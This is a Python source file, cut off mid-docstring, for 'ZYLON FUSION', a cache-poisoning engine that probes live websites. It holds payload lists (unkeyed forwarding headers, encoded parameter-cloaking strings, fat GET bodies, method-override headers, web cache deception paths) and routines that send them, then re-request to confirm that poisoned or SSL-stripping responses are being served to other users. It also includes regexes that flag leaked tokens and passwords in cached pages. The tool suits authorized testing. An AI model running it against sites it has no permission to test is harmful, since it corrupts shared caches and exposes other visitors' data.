#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Cache Poisoning Advanced Engine
======================================================
Fused from: Web-Cache-Vulnerability-Scanner
           + Autopoisoner
           + Custom Zylon Techniques
Capabilities:
  - Cache key manipulation detection
  - Unkeyed input detection (headers, query params, cookies)
  - Cache poisoning via HTTP headers (X-Forwarded-Host, X-Forwarded-Scheme)
  - Web cache deception detection
  - Cache probe and validation
  - Cache poisoning via parameter cloaking
  - Fat GET cache poisoning
  - HTTP method override caching
  - Cache poisoning with Vary header abuse
  - Multi-vector cache testing
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import sys
import re
import json
import time
import hashlib
import threading
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode, urlunparse

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    USER_AGENTS, DEFAULT_TIMEOUT, MAX_THREADS
)

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# CACHE POISONING PAYLOADS
# ============================================================================

# Unkeyed headers to test
UNKEYED_HEADERS = [
    # Standard forwarding headers
    {"X-Forwarded-Host": "zylon-cache-test.example.com"},
    {"X-Forwarded-Scheme": "nothttp"},
    {"X-Forwarded-Proto": "nothttp"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Server": "zylon-cache-test.example.com"},
    {"X-Host": "zylon-cache-test.example.com"},
    {"X-Original-URL": "/zylon-cache-test"},
    {"X-Rewrite-URL": "/zylon-cache-test"},
    # Cloud-specific headers
    {"X-Forwarded-Port": "443"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    # Cache-specific headers
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Cache": "HIT"},
    {"Pragma": "no-cache"},
    {"Cache-Control": "no-cache"},
    # Host header variations
    {"Host": "zylon-cache-test.example.com"},
    # Custom/obscure headers
    {"X-Wap-Profile": "http://zylon-cache-test.example.com/wap.xml"},
    {"X-Device-Type": "mobile"},
    {"X-Forwarded-SSL": "on"},
    {"Front-End-Https": "on"},
    {"X-Request-ID": "zylon-cache-test-12345"},
]

# Parameter cloaking payloads
PARAM_CLOAKING_PAYLOADS = [
    # Parameter with different separators
    "?param=value%23zyloncache",     # URL-encoded #
    "?param=value%3fzyloncache",     # URL-encoded ?
    "?param=value;zyloncache",       # Semicolon separator
    "?param=value%26zyloncache",     # URL-encoded &
    # Double URL encoding
    "?param=value%2523zyloncache",
    # Parameter pollution
    "?param=value&param=zyloncache",
    # Path-based parameter injection
    "?param=value/../../../zyloncache",
    # Fragment injection
    "?param=value%23zyloncache=1",
    # Unicode variations
    "?param=value\uff03zyloncache",  # Fullwidth #
    "?param=value\u2028zyloncache",  # Line separator
    # Null byte injection
    "?param=value%00zyloncache",
    # Tab/newline injection
    "?param=value%09zyloncache",     # Tab
    "?param=value%0azyloncache",     # Newline
    "?param=value%0dzyloncache",     # Carriage return
]

# Fat GET payloads (GET with body)
FAT_GET_PAYLOADS = [
    {"body": "zyloncache=payload1", "content_type": "application/x-www-form-urlencoded"},
    {"body": json.dumps({"zyloncache": "payload1"}), "content_type": "application/json"},
    {"body": "<?xml version='1.0'?><zyloncache>payload1</zyloncache>", "content_type": "application/xml"},
]

# HTTP method override payloads
METHOD_OVERRIDE_HEADERS = [
    {"X-HTTP-Method-Override": "PUT"},
    {"X-HTTP-Method-Override": "PATCH"},
    {"X-HTTP-Method-Override": "DELETE"},
    {"X-HTTP-Method": "PUT"},
    {"X-Method-Override": "PUT"},
    {"X-HTTP-Method": "PATCH"},
    {"X-Method-Override": "PATCH"},
]

# Cache deception paths
CACHE_DECEPTION_PATHS = [
    "/..;/zyloncache.css",
    "/..;/zyloncache.js",
    "/zyloncache.css",
    "/zyloncache.js",
    "/zyloncache.png",
    "/zyloncache.jpg",
    "/zyloncache.ico",
    "/zyloncache.svg",
    "/zyloncache.gif",
    "/zyloncache.pdf",
    "/zyloncache.txt",
    "/..;/zyloncache.css%3f",
    "/%2e%2e%2f/zyloncache.css",
    "/zyloncache.css%23",
    "/zyloncache.css%3f",
    "/zyloncache.css;",
    "/zyloncache.css%3b",
    "/zyloncache.css%250a",
    "/zyloncache.css/..",
    "/zyloncache.css%00",
]

# Vary header abuse patterns
VARY_ABUSE_TESTS = [
    {"description": "Vary: Accept (content negotiation poisoning)", "header": "Accept", "values": [
        "text/html,application/xhtml+xml",
        "application/json",
        "text/plain",
        "*/*",
    ]},
    {"description": "Vary: Accept-Language (locale poisoning)", "header": "Accept-Language", "values": [
        "en-US,en;q=0.9",
        "zh-CN,zh;q=0.9",
        "ja-JP,ja;q=0.9",
        "ar-SA,ar;q=0.9",
    ]},
    {"description": "Vary: Accept-Encoding (encoding poisoning)", "header": "Accept-Encoding", "values": [
        "gzip, deflate, br",
        "identity",
        "compress, gzip",
    ]},
    {"description": "Vary: User-Agent (UA-based cache split)", "header": "User-Agent", "values": [
        "Mozilla/5.0 (compatible; ZylonCacheTest/1.0)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
    ]},
    {"description": "Vary: Cookie (session-based cache split)", "header": "Cookie", "values": [
        "zyloncache=test",
        "session=zyloncache",
    ]},
]


class CachePoisonAdvancedEngine:
    """Cache Poisoning Advanced Engine - Fused from Web-Cache-Vulnerability-Scanner + Autopoisoner + Custom"""

    def __init__(self, timeout=DEFAULT_TIMEOUT, threads=MAX_THREADS, proxy=None):
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': USER_AGENTS[0] if USER_AGENTS else 'Mozilla/5.0'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.lock = threading.Lock()
        self._baseline_cache = {}

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    def _make_request(self, url, method='GET', headers=None, data=None, **kwargs):
        """Make HTTP request with error handling"""
        try:
            resp = self.session.request(
                method, url, headers=headers or {}, data=data,
                timeout=self.timeout, verify=False,
                allow_redirects=kwargs.get('allow_redirects', False),
                **{k: v for k, v in kwargs.items() if k != 'allow_redirects'}
            )
            return resp
        except Exception:
            return None

    def _get_cache_key(self, resp):
        """Generate cache key from response"""
        if not resp:
            return None
        return hashlib.md5(resp.content).hexdigest()

    # ========================================================================
    # CACHE DETECTION
    # ========================================================================

    def detect_cache(self, target):
        """Detect caching mechanism on target

        Args:
            target: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Cache Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {target}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "cache_detected": False,
                "cache_type": "",
                "cache_headers": {},
                "age": None,
                "hit_count": 0,
            },
            "scan_type": "cache_detection",
        }

        # Phase 1: Check cache-related headers
        self._print(f"  [*] Phase 1: Checking cache headers...", CYAN)
        resp = self._make_request(url)
        if not resp:
            self._print(f"  [!] Could not connect to {url}", RED)
            result["findings"].append({
                "type": "error",
                "description": f"Could not connect to {url}",
            })
            return result

        cache_headers_found = {}
        cache_header_names = [
            'X-Cache', 'X-Cache-Lookup', 'X-Cache-Status',
            'CF-Cache-Status', 'Age', 'Cache-Control',
            'X-Squid-Error', 'X-Varnish', 'X-CDN',
            'X-Fastly-Request-ID', 'X-Amz-Cf-Id',
            'X-Goog-Translated-Languages', 'Akamai-Cache',
            'X-Akamai-Transformed', 'X-Drup-Cache',
            'X-Cache-Key', 'X-HS-Cache', 'Surrogate-Key',
            'Surrogate-Control', 'X-Proxy-Cache',
        ]

        for header in cache_header_names:
            value = resp.headers.get(header)
            if value:
                cache_headers_found[header] = value

        result["details"]["cache_headers"] = cache_headers_found

        # Analyze cache headers
        x_cache = resp.headers.get('X-Cache', '').lower()
        cf_cache = resp.headers.get('CF-Cache-Status', '').lower()
        age = resp.headers.get('Age', '')

        if x_cache in ('hit', 'miss', 'stale', 'updating', 'revalidated'):
            result["details"]["cache_detected"] = True
            result["details"]["cache_type"] = "Generic CDN/Proxy"
            self._print(f"  [+] Cache detected via X-Cache: {x_cache}", GREEN)

        if cf_cache in ('hit', 'miss', 'stale', 'bypass', 'updating', 'revalidated', 'dynamic', 'expired'):
            result["details"]["cache_detected"] = True
            result["details"]["cache_type"] = "Cloudflare"
            self._print(f"  [+] Cloudflare cache detected: {cf_cache}", GREEN)

        if age:
            result["details"]["cache_detected"] = True
            result["details"]["age"] = age
            self._print(f"  [+] Cache Age header found: {age}s", GREEN)

        # Phase 2: Timing-based cache detection
        self._print(f"  [*] Phase 2: Timing-based cache detection...", CYAN)
        request_times = []
        for i in range(3):
            start = time.time()
            resp2 = self._make_request(url)
            elapsed = time.time() - start
            if resp2:
                request_times.append(elapsed)
                # Check for HIT
                x_cache2 = resp2.headers.get('X-Cache', '').lower()
                cf_cache2 = resp2.headers.get('CF-Cache-Status', '').lower()
                if 'hit' in x_cache2 or 'hit' in cf_cache2:
                    result["details"]["hit_count"] += 1

        if request_times:
            avg_time = sum(request_times) / len(request_times)
            self._print(f"  [*] Average response time: {avg_time:.3f}s", DIM + CYAN)

        # Phase 3: Verify caching via multiple requests
        self._print(f"  [*] Phase 3: Cache verification...", CYAN)
        cache_marker = f"zyloncachetest{random.randint(1000, 9999)}"
        test_url = f"{url}{'&' if '?' in url else '?'}{cache_marker}=1"

        resp_a = self._make_request(test_url)
        time.sleep(0.5)
        resp_b = self._make_request(test_url)

        if resp_a and resp_b:
            hash_a = self._get_cache_key(resp_a)
            hash_b = self._get_cache_key(resp_b)
            if hash_a == hash_b:
                result["details"]["cache_detected"] = True
                self._print(f"  [+] Cache confirmed: consistent responses across requests", GREEN)

        # Determine cache type if not already
        if result["details"]["cache_detected"] and not result["details"]["cache_type"]:
            server = resp.headers.get('Server', '').lower()
            via = resp.headers.get('Via', '').lower()
            if 'cloudflare' in server or 'cloudflare' in via:
                result["details"]["cache_type"] = "Cloudflare"
            elif 'nginx' in server:
                result["details"]["cache_type"] = "nginx"
            elif 'varnish' in via or 'x-varnish' in cache_headers_found:
                result["details"]["cache_type"] = "Varnish"
            elif 'akamai' in cache_headers_found.get('X-Akamai-Transformed', '').lower():
                result["details"]["cache_type"] = "Akamai"
            elif 'squat' in via or 'squid' in via:
                result["details"]["cache_type"] = "Squid"
            else:
                result["details"]["cache_type"] = "Unknown CDN/Cache"

        if result["details"]["cache_detected"]:
            result["vulnerable"] = True  # Cache exists = potential target
            result["findings"].append({
                "type": "cache_detected",
                "severity": "Info",
                "description": f"Cache detected: {result['details']['cache_type']}. "
                              f"Headers: {cache_headers_found}",
            })
            self._print(f"  [+] Cache Type: {result['details']['cache_type']}", GREEN)
            self._print(f"  [+] Cache Headers: {list(cache_headers_found.keys())}", GREEN)
        else:
            self._print(f"  [-] No caching mechanism detected", YELLOW)

        return result

    # ========================================================================
    # UNKEYED INPUT DETECTION
    # ========================================================================

    def find_unkeyed_inputs(self, url):
        """Find unkeyed inputs (headers, params, cookies)

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Unkeyed Input Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "unkeyed_headers": [],
                "unkeyed_params": [],
                "unkeyed_cookies": [],
                "headers_tested": 0,
                "params_tested": 0,
            },
            "scan_type": "unkeyed_input_detection",
        }

        # Step 1: Get baseline response
        self._print(f"  [*] Capturing baseline...", CYAN)
        baseline_resp = self._make_request(url)
        if not baseline_resp:
            self._print(f"  [!] Could not connect to {url}", RED)
            result["findings"].append({
                "type": "error",
                "description": f"Could not connect to {url}",
            })
            return result

        baseline_hash = self._get_cache_key(baseline_resp)
        baseline_body = baseline_resp.text
        self._print(f"  [*] Baseline: {baseline_resp.status_code}/{len(baseline_resp.content)}B", DIM + CYAN)

        # Step 2: Test unkeyed headers
        self._print(f"  [*] Testing {len(UNKEYED_HEADERS)} unkeyed headers...", CYAN)

        def test_header(header_dict):
            try:
                resp = self._make_request(url, headers=header_dict)
                if not resp:
                    return None

                result["details"]["headers_tested"] += 1
                resp_hash = self._get_cache_key(resp)
                header_name = list(header_dict.keys())[0]
                header_value = list(header_dict.values())[0]

                # Check for response differences
                is_different = resp_hash != baseline_hash

                # Check if the header value is reflected in the response
                is_reflected = header_value in resp.text and header_value not in baseline_body

                # Check for cache hit with different content
                cache_status = resp.headers.get('X-Cache', '').lower()
                cf_cache_status = resp.headers.get('CF-Cache-Status', '').lower()
                is_cached = 'hit' in cache_status or 'hit' in cf_cache_status

                finding = {
                    "header": header_name,
                    "value": header_value,
                    "response_different": is_different,
                    "reflected": is_reflected,
                    "cache_hit": is_cached,
                    "status_code": resp.status_code,
                    "content_length": len(resp.content),
                }

                if is_reflected or (is_different and is_cached):
                    return finding
                return None

            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=min(self.threads, 5)) as executor:
            futures = {executor.submit(test_header, h): h for h in UNKEYED_HEADERS}
            for future in as_completed(futures):
                finding = future.result()
                if finding:
                    result["details"]["unkeyed_headers"].append(finding)
                    self._print(f"  [!] Unkeyed header: {finding['header']} "
                                f"(reflected: {finding['reflected']}, "
                                f"cached: {finding['cache_hit']})", YELLOW)

        # Step 3: Test unkeyed query parameters
        self._print(f"  [*] Testing unkeyed query parameters...", CYAN)
        cache_test_params = [
            "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
            "fbclid", "gclid", "msclkid", "ref", "source", "campaign",
            "_ga", "_gl", "_gid", "mc_cid", "mc_eid",
            "zyloncache", "cachebuster", "nocache", "rand", "v",
        ]

        for param in cache_test_params:
            test_url = f"{url}{'&' if '?' in url else '?'}{param}=zyloncache_test_{random.randint(1000,9999)}"
            try:
                resp = self._make_request(test_url)
                result["details"]["params_tested"] += 1
                if resp:
                    resp_hash = self._get_cache_key(resp)
                    if resp_hash == baseline_hash:
                        # Same response = parameter likely unkeyed
                        result["details"]["unkeyed_params"].append(param)
                        self._print(f"  [!] Unkeyed param: {param}", YELLOW)
            except Exception:
                pass

        # Step 4: Test unkeyed cookies
        self._print(f"  [*] Testing unkeyed cookies...", CYAN)
        test_cookies = [
            {"zyloncache": "test_value_1"},
            {"user_prefs": "zyloncache_test"},
            {"theme": "zyloncache_test"},
            {"lang": "zyloncache_test"},
        ]

        for cookie_dict in test_cookies:
            try:
                resp = self._make_request(url, cookies=cookie_dict)
                if resp:
                    cookie_name = list(cookie_dict.keys())[0]
                    cookie_value = list(cookie_dict.values())[0]
                    if cookie_value in resp.text and cookie_value not in baseline_body:
                        result["details"]["unkeyed_cookies"].append(cookie_name)
                        self._print(f"  [!] Unkeyed cookie: {cookie_name}", YELLOW)
            except Exception:
                pass

        # Summary
        total_unkeyed = (
            len(result["details"]["unkeyed_headers"]) +
            len(result["details"]["unkeyed_params"]) +
            len(result["details"]["unkeyed_cookies"])
        )

        if total_unkeyed > 0:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "unkeyed_inputs",
                "severity": "High",
                "description": f"Found {total_unkeyed} unkeyed input(s): "
                              f"{len(result['details']['unkeyed_headers'])} headers, "
                              f"{len(result['details']['unkeyed_params'])} params, "
                              f"{len(result['details']['unkeyed_cookies'])} cookies",
            })
            self._print(f"  [!!!] Found {total_unkeyed} unkeyed input(s)!", RED)
        else:
            self._print(f"  [-] No unkeyed inputs detected", GREEN)

        return result

    # ========================================================================
    # HEADER-BASED CACHE POISONING
    # ========================================================================

    def test_header_poisoning(self, url):
        """Test cache poisoning via HTTP headers

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Cache Header Poisoning{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "poisonable_headers": [],
                "headers_tested": 0,
                "reflected_headers": [],
            },
            "scan_type": "cache_header_poisoning",
        }

        # Generate unique poison markers
        poison_marker = f"zylonpoison{random.randint(10000, 99999)}"

        # Step 1: Test X-Forwarded-Host poisoning
        self._print(f"  [*] Testing X-Forwarded-Host poisoning...", CYAN)
        xfh_payloads = [
            {"X-Forwarded-Host": poison_marker},
            {"X-Forwarded-Host": f"{poison_marker}.example.com"},
            {"X-Host": poison_marker},
            {"X-Host": f"{poison_marker}.example.com"},
            {"X-Forwarded-Server": poison_marker},
        ]

        for header_dict in xfh_payloads:
            try:
                resp = self._make_request(url, headers=header_dict)
                result["details"]["headers_tested"] += 1
                if resp and poison_marker in resp.text:
                    header_name = list(header_dict.keys())[0]
                    result["details"]["poisonable_headers"].append(header_name)
                    result["details"]["reflected_headers"].append({
                        "header": header_name,
                        "value": header_dict[header_name],
                        "reflected": True,
                    })
                    self._print(f"  [!!!] Header reflected: {header_name} -> {header_dict[header_name]}", RED)

                    # Verify cache poisoning
                    time.sleep(0.5)
                    verify_resp = self._make_request(url)
                    if verify_resp and poison_marker in verify_resp.text:
                        result["vulnerable"] = True
                        result["findings"].append({
                            "type": "cache_poison_header",
                            "severity": "Critical",
                            "description": f"Cache poisoning via {header_name}! "
                                          f"Poisoned response served to other users.",
                            "header": header_name,
                            "value": header_dict[header_name],
                            "verified": True,
                        })
                        self._print(f"  [!!!] CACHE POISONING CONFIRMED via {header_name}!", RED)
            except Exception:
                pass

        # Step 2: Test X-Forwarded-Scheme poisoning
        self._print(f"  [*] Testing X-Forwarded-Scheme poisoning...", CYAN)
        scheme_payloads = [
            {"X-Forwarded-Scheme": "nothttp"},
            {"X-Forwarded-Proto": "nothttp"},
            {"X-Forwarded-Scheme": "http"},
            {"X-Forwarded-Proto": "http"},
        ]

        for header_dict in scheme_payloads:
            try:
                resp = self._make_request(url, headers=header_dict)
                result["details"]["headers_tested"] += 1
                if resp:
                    # Check for redirect (common with scheme poisoning)
                    if resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get('Location', '')
                        if 'nothttp' in location or location.startswith('http://'):
                            header_name = list(header_dict.keys())[0]
                            result["details"]["poisonable_headers"].append(header_name)
                            self._print(f"  [!] Scheme poisoning: {header_name} causes redirect to {location}", YELLOW)

                            # Verify
                            time.sleep(0.5)
                            verify_resp = self._make_request(url)
                            if verify_resp and verify_resp.status_code in (301, 302, 303, 307, 308):
                                verify_location = verify_resp.headers.get('Location', '')
                                if verify_location.startswith('http://'):
                                    result["vulnerable"] = True
                                    result["findings"].append({
                                        "type": "cache_poison_scheme",
                                        "severity": "Critical",
                                        "description": f"Cache poisoning via {header_name}! "
                                                      f"Redirects to HTTP (ssl stripping).",
                                        "header": header_name,
                                        "redirect_to": verify_location,
                                        "verified": True,
                                    })
                                    self._print(f"  [!!!] CACHE POISONING CONFIRMED: SSL stripping!", RED)
            except Exception:
                pass

        # Step 3: Test Vary header abuse
        self._print(f"  [*] Testing Vary header abuse...", CYAN)
        baseline_resp = self._make_request(url)
        if baseline_resp:
            vary_header = baseline_resp.headers.get('Vary', '')
            if vary_header:
                self._print(f"  [*] Vary header found: {vary_header}", CYAN)
                vary_fields = [v.strip() for v in vary_header.split(',')]

                for vary_test in VARY_ABUSE_TESTS:
                    if vary_test["header"].lower() in [v.lower() for v in vary_fields]:
                        self._print(f"  [*] Testing Vary: {vary_test['header']}...", CYAN)
                        for value in vary_test["values"]:
                            try:
                                resp = self._make_request(url, headers={vary_test["header"]: value})
                                if resp and value in resp.text:
                                    # Verify cached response
                                    time.sleep(0.5)
                                    verify_resp = self._make_request(url)
                                    if verify_resp and value in verify_resp.text:
                                        result["vulnerable"] = True
                                        result["findings"].append({
                                            "type": "cache_vary_abuse",
                                            "severity": "High",
                                            "description": f"Cache poisoning via Vary header abuse! "
                                                          f"Vary: {vary_test['header']}, "
                                                          f"Value: {value}",
                                            "vary_header": vary_test["header"],
                                            "value": value,
                                            "verified": True,
                                        })
                                        self._print(f"  [!!!] Vary abuse confirmed: {vary_test['header']}", RED)
                            except Exception:
                                pass

        if not result["vulnerable"]:
            self._print(f"  [-] No cache header poisoning detected", GREEN)

        return result

    # ========================================================================
    # PARAMETER CLOAKING
    # ========================================================================

    def test_param_cloaking(self, url):
        """Test cache poisoning via parameter cloaking

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Cache Parameter Cloaking{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "cloaking_techniques": [],
                "payloads_tested": 0,
                "differential_responses": [],
            },
            "scan_type": "cache_param_cloaking",
        }

        # Get baseline
        self._print(f"  [*] Capturing baseline...", CYAN)
        baseline_resp = self._make_request(url)
        if not baseline_resp:
            result["findings"].append({"type": "error", "description": f"Cannot connect to {url}"})
            return result

        baseline_hash = self._get_cache_key(baseline_resp)

        # Test parameter cloaking
        self._print(f"  [*] Testing {len(PARAM_CLOAKING_PAYLOADS)} cloaking payloads...", CYAN)

        for payload in PARAM_CLOAKING_PAYLOADS:
            test_url = f"{url}{payload}" if not url.endswith(payload) else url
            try:
                resp = self._make_request(test_url)
                result["details"]["payloads_tested"] += 1
                if resp:
                    resp_hash = self._get_cache_key(resp)
                    if resp_hash == baseline_hash:
                        # Same cached response = parameter cloaked
                        result["details"]["cloaking_techniques"].append(payload)
                        self._print(f"  [!] Cloaking works: {payload[:50]}", YELLOW)
                    elif resp_hash != baseline_hash:
                        # Different response - parameter affects cache
                        result["details"]["differential_responses"].append({
                            "payload": payload,
                            "status_code": resp.status_code,
                            "content_length": len(resp.content),
                        })
            except Exception:
                pass

        if result["details"]["cloaking_techniques"]:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "param_cloaking",
                "severity": "Medium",
                "description": f"Parameter cloaking detected! "
                              f"{len(result['details']['cloaking_techniques'])} techniques bypass cache key.",
                "techniques": result["details"]["cloaking_techniques"][:5],
            })
            self._print(f"  [!!!] Parameter cloaking: {len(result['details']['cloaking_techniques'])} "
                         f"techniques bypass cache key!", RED)
        else:
            self._print(f"  [-] No parameter cloaking detected", GREEN)

        return result

    # ========================================================================
    # CACHE DECEPTION
    # ========================================================================

    def test_cache_deception(self, url):
        """Test web cache deception

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Cache Deception Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "deception_paths_tested": 0,
                "cached_paths": [],
                "sensitive_data_leaked": False,
            },
            "scan_type": "cache_deception",
        }

        # Get baseline to check for sensitive data markers
        baseline_resp = self._make_request(url)
        if not baseline_resp:
            result["findings"].append({"type": "error", "description": f"Cannot connect to {url}"})
            return result

        # Sensitive data markers to look for
        sensitive_patterns = [
            r'(?:api[_-]?key|apikey)\s*[:=]\s*["\'][^"\']+["\']',
            r'(?:token|session|auth)\s*[:=]\s*["\'][^"\']+["\']',
            r'(?:password|passwd|pass)\s*[:=]\s*["\'][^"\']+["\']',
            r'(?:email|username|user)\s*[:=]\s*["\'][^"\']+["\']',
            r'(?:private|secret|credential)\s*[:=]\s*["\'][^"\']+["\']',
            r'\b(?:username|user_id|account)\s*[:=]\s*["\'][^"\']+["\']',
        ]

        baseline_sensitive = False
        for pattern in sensitive_patterns:
            if re.search(pattern, baseline_resp.text, re.IGNORECASE):
                baseline_sensitive = True
                break

        # Test cache deception paths
        self._print(f"  [*] Testing {len(CACHE_DECEPTION_PATHS)} deception paths...", CYAN)

        for path_suffix in CACHE_DECEPTION_PATHS:
            test_url = f"{url.rstrip('/')}{path_suffix}"
            try:
                resp = self._make_request(test_url)
                result["details"]["deception_paths_tested"] += 1

                if not resp:
                    continue

                # Check if response is cached
                cache_status = resp.headers.get('X-Cache', '').lower()
                cf_cache = resp.headers.get('CF-Cache-Status', '').lower()
                age = resp.headers.get('Age', '')
                is_cached = 'hit' in cache_status or 'hit' in cf_cache or age

                # Check if same content as original (deception = page served with static extension)
                content_similarity = False
                if baseline_resp and resp.status_code == 200:
                    # Check if content is similar to baseline
                    if len(resp.content) > 100 and len(baseline_resp.content) > 100:
                        # Rough similarity check
                        shorter = min(len(resp.content), len(baseline_resp.content))
                        longer = max(len(resp.content), len(baseline_resp.content))
                        if shorter / longer > 0.8:
                            content_similarity = True

                # Check for sensitive data in cached response
                sensitive_found = False
                for pattern in sensitive_patterns:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        sensitive_found = True
                        break

                if is_cached or content_similarity:
                    deception_info = {
                        "path": path_suffix,
                        "url": test_url,
                        "cached": is_cached,
                        "content_similarity": content_similarity,
                        "sensitive_data": sensitive_found,
                        "status_code": resp.status_code,
                    }
                    result["details"]["cached_paths"].append(deception_info)

                    if sensitive_found:
                        result["details"]["sensitive_data_leaked"] = True
                        self._print(f"  [!!!] Sensitive data in cached path: {path_suffix}", RED)
                    else:
                        self._print(f"  [!] Cached path: {path_suffix}", YELLOW)

            except Exception:
                pass

        if result["details"]["cached_paths"]:
            result["vulnerable"] = True
            severity = "Critical" if result["details"]["sensitive_data_leaked"] else "Medium"
            result["findings"].append({
                "type": "cache_deception",
                "severity": severity,
                "description": f"Web cache deception! {len(result['details']['cached_paths'])} paths "
                              f"serve dynamic content with static extensions. "
                              f"Sensitive data leaked: {result['details']['sensitive_data_leaked']}",
                "cached_paths": [p["path"] for p in result["details"]["cached_paths"][:10]],
            })
            self._print(f"  [!!!] Cache deception detected: "
                         f"{len(result['details']['cached_paths'])} paths!", RED)
        else:
            self._print(f"  [-] No cache deception detected", GREEN)

        return result

    # ========================================================================
    # FAT GET POISONING
    # ========================================================================

    def test_fat_get(self, url):
        """Test Fat GET cache poisoning (GET with body)

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Fat GET Cache Poisoning{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "payloads_tested": 0,
                "body_accepted": False,
                "body_cached": False,
            },
            "scan_type": "cache_fat_get",
        }

        # Get baseline
        baseline_resp = self._make_request(url)
        if not baseline_resp:
            result["findings"].append({"type": "error", "description": f"Cannot connect to {url}"})
            return result

        baseline_hash = self._get_cache_key(baseline_resp)

        # Test Fat GET requests
        self._print(f"  [*] Testing Fat GET requests...", CYAN)

        for payload in FAT_GET_PAYLOADS:
            try:
                headers = {'Content-Type': payload["content_type"]}
                resp = self._make_request(url, method='GET', headers=headers, data=payload["body"])
                result["details"]["payloads_tested"] += 1

                if resp:
                    resp_hash = self._get_cache_key(resp)
                    poison_marker = "zyloncache"

                    # Check if body content affects response
                    if resp_hash != baseline_hash:
                        result["details"]["body_accepted"] = True
                        self._print(f"  [!] GET body affects response ({payload['content_type']})", YELLOW)

                        # Verify if the response is cached
                        time.sleep(0.5)
                        verify_resp = self._make_request(url)
                        if verify_resp:
                            verify_hash = self._get_cache_key(verify_resp)
                            if verify_hash != baseline_hash:
                                result["details"]["body_cached"] = True
                                result["vulnerable"] = True
                                result["findings"].append({
                                    "type": "fat_get_cache_poison",
                                    "severity": "High",
                                    "description": f"Fat GET cache poisoning! GET request body "
                                                  f"affects cached response. Content-Type: {payload['content_type']}",
                                    "content_type": payload["content_type"],
                                    "body": payload["body"],
                                    "verified": True,
                                })
                                self._print(f"  [!!!] FAT GET CACHE POISONING CONFIRMED!", RED)

            except Exception:
                pass

        # Test HTTP method override
        self._print(f"  [*] Testing HTTP method override caching...", CYAN)
        for override_headers in METHOD_OVERRIDE_HEADERS:
            try:
                resp = self._make_request(url, headers=override_headers)
                result["details"]["payloads_tested"] += 1
                if resp:
                    resp_hash = self._get_cache_key(resp)
                    if resp_hash != baseline_hash:
                        header_name = list(override_headers.keys())[0]
                        self._print(f"  [!] Method override affects response: {header_name}", YELLOW)

                        time.sleep(0.5)
                        verify_resp = self._make_request(url)
                        if verify_resp:
                            verify_hash = self._get_cache_key(verify_resp)
                            if verify_hash != baseline_hash:
                                result["vulnerable"] = True
                                result["findings"].append({
                                    "type": "method_override_cache",
                                    "severity": "High",
                                    "description": f"HTTP method override cache poisoning! "
                                                  f"Header: {override_headers}",
                                    "headers": override_headers,
                                    "verified": True,
                                })
                                self._print(f"  [!!!] METHOD OVERRIDE CACHE POISONING CONFIRMED!", RED)
            except Exception:
                pass

        if not result["vulnerable"]:
            self._print(f"  [-] No Fat GET cache poisoning detected", GREEN)

        return result

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """Main entry point for Cache Poisoning Advanced Engine

        Args:
